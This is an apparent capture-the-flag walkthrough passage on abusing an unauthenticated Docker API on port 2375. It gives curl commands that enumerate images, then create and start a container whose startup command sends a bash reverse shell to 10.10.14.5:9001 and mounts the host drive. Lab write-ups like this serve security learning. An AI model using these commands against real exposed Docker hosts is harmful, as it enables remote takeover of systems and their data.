Ok so let's see what we can do
After a lot of research, i found that the port 2375 allow me to communicate directly with the docker API, allowing me to create container.

So assuming i can create a container, i can try to put a payload that will trigger at startup of the container, send me a reverse shell and mount the target system on that container.

First i had to enumerate the image available.

```
curl http://192.168.65.7:2375/images/json
```

And i found the image `docker_setup-nginx-php`

So let's craft our payload

```
curl -X POST -H "Content-Type: application/json" \
-d '{"Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"], "HostConfig": {"Binds": ["/mnt/host/c:/mnt"]}}' \
http://192.168.65.7:2375/containers/create
```
To explain the payload, i created a container with the image docker_setup-nginx-php, at startup it runs the command `/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"` which send me a reverse shell on the port 9001. It also run the target system to the /mnt directory. 
Now our container is created, but it is not started yet.

After we submit our payload, we get a container ID, we must use it to start our created container.

```
curl -X POST http://192.168.65.7:2375/containers/<container_id>/start
```
